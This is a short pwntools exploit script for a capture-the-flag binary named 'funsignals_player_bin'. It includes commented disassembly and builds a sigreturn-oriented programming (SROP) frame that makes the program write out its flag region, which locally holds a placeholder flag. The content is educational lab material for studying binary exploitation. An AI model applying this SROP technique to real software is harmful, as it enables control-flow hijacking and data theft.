from pwn import *

context.arch = "amd64"
context.binary = ELF("./funsignals_player_bin")
elf = ELF("./funsignals_player_bin")
target = process("./funsignals_player_bin")

# objdump -d ./funsignals_player_bin
# 0000000010000000 <__start>:
#     10000000:   31 c0                   xor    %eax,%eax
#     10000002:   31 ff                   xor    %edi,%edi
#     10000004:   31 d2                   xor    %edx,%edx
#     10000006:   b6 04                   mov    $0x4,%dh
#     10000008:   48 89 e6                mov    %rsp,%rsi
#     1000000b:   0f 05                   syscall
#     1000000d:   31 ff                   xor    %edi,%edi
#     1000000f:   6a 0f                   push   $0xf
#     10000011:   58                      pop    %rax
#     10000012:   0f 05                   syscall
#     10000014:   cc                      int3

# 0000000010000015 <syscall>:
#     10000015:   0f 05                   syscall
#     10000017:   48 31 ff                xor    %rdi,%rdi
#     1000001a:   48 c7 c0 3c 00 00 00    mov    $0x3c,%rax
#     10000021:   0f 05                   syscall

# 0000000010000023 <flag>:
#     10000023:   66 61                   data16 (bad)
#     10000025:   6b 65 5f 66             imul   $0x66,0x5f(%rbp),%esp
#     10000029:   6c                      insb   (%dx),%es:(%rdi)
#     1000002a:   61                      (bad)
#     1000002b:   67 5f                   addr32 pop %rdi
#     1000002d:   68 65 72 65 5f          push   $0x5f657265
#     10000032:   61                      (bad)
#     10000033:   73 5f                   jae    10000094 <flag+0x71>
#     10000035:   6f                      outsl  %ds:(%rsi),(%dx)
#     10000036:   72 69                   jb     100000a1 <flag+0x7e>
#     10000038:   67 69 6e 61 6c 5f 69    imul   $0x73695f6c,0x61(%esi),%ebp
#     1000003f:   73
#     10000040:   5f                      pop    %rdi
#     10000041:   61                      (bad)
#     10000042:   74 5f                   je     100000a3 <flag+0x80>
#     10000044:   73 65                   jae    100000ab <flag+0x88>
#     10000046:   72 76                   jb     100000be <flag+0x9b>
#     10000048:   65 72 00                gs jb  1000004b <flag+0x28>


frame = SigreturnFrame()
frame.rip = 0x1000000b
frame.rax = 0x1
frame.rdi = 0x1
frame.rsi = 0x10000023
frame.rdx = 0x100

target.send(bytes(frame))
log.success("Sigreturn Frame restored successfully! Flag leaked below:")
target.interactive()
